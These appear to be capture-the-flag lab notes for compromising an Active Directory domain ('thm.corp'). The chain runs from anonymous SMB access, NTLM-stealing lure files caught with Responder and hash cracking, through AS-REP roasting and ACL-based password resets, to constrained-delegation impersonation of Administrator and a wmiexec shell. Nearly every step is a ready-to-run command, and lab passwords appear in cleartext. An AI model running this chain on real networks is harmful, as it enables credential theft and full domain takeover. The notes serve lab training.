`nmap -Pn -A 10.48.140.75 --min-parallelism=32`
shows winrm(5985), smb (445) and bunch of others.
and `sudo $(which autorecon) 10.48.140.75`

we see a bunch of ports, and dns thm.corp and another HayStack.thm.corp. add that to /etc/hosts
To enumerate smb shares, we use 
`smbclient -U '' -L //10.48.140.75` OR
`crackmapexec smb 10.48.140.75 -u 'anonymous' -p '' --shares`
we see we have read access to IPC$ and read/write to data share.
Now use smbclient to connect to the shares
`smbclient -U 'anonymous' //10.48.140.75/IPC$` -- nothing came out of this, but we can use it to move files from win to lin later if req.
`smbclient -U 'anonymous //10.48.140.75/data`
we find an onboarding text in the share, which has the initial password "resetMe123!"
There's also a --rid-brute we can try that will enumerate the users in the smb share
`crackmapexec smb 10.48.140.75 -u 'Anonymous' -p '' --rid-brute 10000`

Note - when we do ls again on the data/onboarding, we find the names of the files have been changed, but the content is same. That tells us a user periodically updating the names for every files in that share. (can verify by `put test.txt` into the share.)
We use this ntlm_theft.py to generate any type of file, which will steal the username/ntlm of the user that interacts with it.
`python ~/AD_tools/ntlm_theft/ntlm_theft.py -g all -s ATT_IP -f out_folder` 
--> g is for output file type --> -g can be lnk, url, all

Start the responder and the put the file (I choose lnk file)
`sudo responder -I tun0 -v`
We get the username, NTLM hash for the user AUTOMATE. john it
`john hash.txt --wordlist=rockyou`
Passw0rd1

Now, since we have initial foothold creds, we can now enumerate using bloodhound-python
`bloodhound-python -u 'AUTOMATE' -p 'REDACTED' -ns $VMIP -d thm.corp -c all` OR
`bloodhound-python -u 'automate' -p 'Passw0rd1' -ns 10.48.140.75 --dns-tcp -d thm.corp -c All --zip`
The second one will give a zip file for us to load to bloodhound
start neo4j, and bloodhound `/opt/BloodHound-linux-x64/BloodHound --no-sandbox`

From here, go to analysis, and check for As-Repable user(no kerberos preauth req)
We can also use Impacket's GetNPUsers.py script to enumerate AsRep-roastable users.
We get 3 users here, put their names into a file, and this time, use the same GetNPUsers.py to get their asreproasted hashes
`python3 GetNPUsers.py -request thm.corp/ -usersfile users -format john -outputfile hashes.asreproast`
Gives us Tabatha's password.

Let us focus back on Bloodhound, and check for "transitive object control" under "outbound object control properties" for Tabatha. We see a link, `TABATHA_BRITT` has `GenericAll` rights on `SHAWNA_BRAY`, which in its turn has `ForceChangePassword` rights on `CRUZ_HALL` which also has `GenericWrite` access on `DARLA_WINTERS`.
When we right-click on the edge, click on help icon, we see how we can exploit that relation.
In this case, it is essentially a reset password, which can be done by "net rpc password" cmd
`net rpc password 'target user' 'newPassword' -U 'adomain'\'current_user'%'password' -S Domain_controllerIP`
`net rpc password 'SHAWNA_BRAY' 'newP@ssword2022' -U thm.corp/'TABATHA_BRITT'%'marlboro(1985)' -S 10.48.140.75`
`net rpc password 'CRUZ_HALL' 'newP@ssword2022' -U thm.corp/'SHAWNA_BRAY'%'newP@ssword2022' -S 10.48.140.75`

If we look at Node info for Darla_winters, we see that she has ==constrained delegation== on `cifs/HayStack.thm.corp/thm.corp`, this means we can request a service ticket for other users (like administrator), assuming the target `SPN` is allowed for delegation.
This means we can impersonate Administrator for the `CIFS` service on the Domain Controller (haystack.thm.corp).

NOTE - since we use kerberos for the next step, make sure the time is synced between attacker and dc, cuz of timestamp thing--- `ntpdate -s thm.corp`

we use impacket-getST for this.
`impacket-getST -spn cifs/HAYSTACK.THM.CORP -impersonate Administrator "thm.corp/DARLA_WINTERS:newP@ssword2022" -dc-ip $VMIP`
should save admin's ticket to a .ccache file, which we'll assign to an env var
`export KRB5CCNAME=Administrator.ccache`
Then we use impacket-wmiexec to get the admin shell.
`impacket-wmiexec -no-pass -k thm.corp/administrator@HAYSTACK.THM.CORP`
